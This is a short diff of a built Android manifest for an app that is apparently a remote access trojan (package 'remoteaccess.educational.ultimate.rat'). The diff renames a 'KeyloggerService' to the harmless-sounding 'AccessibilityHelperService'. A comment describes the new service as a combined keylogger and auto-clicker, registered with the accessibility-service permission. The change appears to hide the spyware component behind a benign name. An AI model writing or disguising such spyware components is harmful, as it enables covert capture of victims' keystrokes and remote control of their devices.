@@ -170,11 +170,11 @@
 97            </intent-filter>
 98        </receiver>
 99
-100        <!-- Accessibility Service for Keylogger -->
+100        <!-- Combined Accessibility Service (Keylogger + Auto-Click) -->
 101        <service
 101-->/home/runner/workspace/app/src/main/AndroidManifest.xml:82:9-92:19
-102            android:name="com.remoteaccess.educational.ultimate.rat.KeyloggerService"
-102-->/home/runner/workspace/app/src/main/AndroidManifest.xml:83:13-58
+102            android:name="com.remoteaccess.educational.permissions.AccessibilityHelperService"
+102-->/home/runner/workspace/app/src/main/AndroidManifest.xml:83:13-67
 103            android:exported="true"
 103-->/home/runner/workspace/app/src/main/AndroidManifest.xml:85:13-36
 104            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" >
